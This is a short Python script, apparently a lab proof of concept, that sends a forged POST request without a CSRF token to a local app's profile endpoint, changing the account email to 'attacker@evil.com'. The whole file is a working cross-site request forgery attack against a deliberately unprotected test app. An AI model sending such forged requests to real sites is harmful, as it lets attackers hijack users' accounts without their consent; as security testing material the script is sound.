import requests

def run_csrf_attack():
    # Exploit lack of CSRF protection by posting unauthorized email update
    target_url = "http://127.0.0.1:5000/profile"
    data = {'email': 'attacker@evil.com'}
    # No CSRF token sent, vulnerable app will accept this request
    response = requests.post(target_url, data=data)
    if response.status_code == 200:
        print("CSRF attack simulated: email update attempted")
    else:
        print("CSRF attack failed or blocked")

if __name__ == "__main__":
    run_csrf_attack()
